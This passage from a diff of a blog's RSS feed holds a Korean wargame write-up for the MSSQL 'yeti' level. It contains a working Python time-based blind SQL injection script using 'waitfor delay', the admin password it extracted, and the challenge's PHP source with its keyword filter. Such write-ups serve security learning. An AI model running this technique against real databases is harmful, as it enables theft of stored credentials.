-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;	
-
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Found length : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Find password&quot;&lt;/span&gt;
-	
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;123&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; if ((select pw from prob_yeti where id='admin') like '&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;') waitfor delay '00:00:03' else waitfor delay '00:00:00' -- &quot;&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[-] Error occur&quot;&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
-
-		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Found &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Found password : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] End&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;그 결과 아래와 같이 결과값을 얻을 수 있었다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python ex.py 
-[+] Start
-[+] Find length of the password
-[+] Found length :  8
-[+] Find password
-[+] Found 1 : 6
-[+] Found 2 : 64
-[+] Found 3 : 642
-[+] Found 4 : 6425
-[+] Found 5 : 6425B
-[+] Found 6 : 6425B7
-[+] Found 7 : 6425B72
-[+] Found 8 : 6425B725
-[+] Found password :  6425B725
-[+] End
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;따라서 알파벳을 소문자로 바꾸어 아래와 같이 입력하면 문제를 풀 수 있다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?pw=6425b725
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;------------------------------------------------------------------------------------
-query : select id from prob_yeti where id='' and pw='6425b725'
-------------------------------------------------------------------------------------
-
-YETI Clear!
-
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;./config.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;login_chk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-  &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mssql_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;yeti&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/master|sys|information|;/i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;No Hack ~_~&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/master|sys|information|;/i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pw'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;No Hack ~_~&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;select id from prob_yeti where id='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;' and pw='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pw'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;hr&amp;gt;query : &amp;lt;strong&amp;gt;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;/strong&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;sqlsrv_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-  &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;select pw from prob_yeti where id='admin'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
-  &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sqlsrv_fetch_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sqlsrv_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pw'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pw'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;yeti&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
-  &lt;span class=&quot;nb&quot;&gt;highlight_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;YETI Clear&lt;/code&gt;&lt;/p&gt;
-</description>
-        <pubDate>Mon, 29 Jul 2019 00:00:00 +0900</pubDate>
       </item>
     
   </channel>
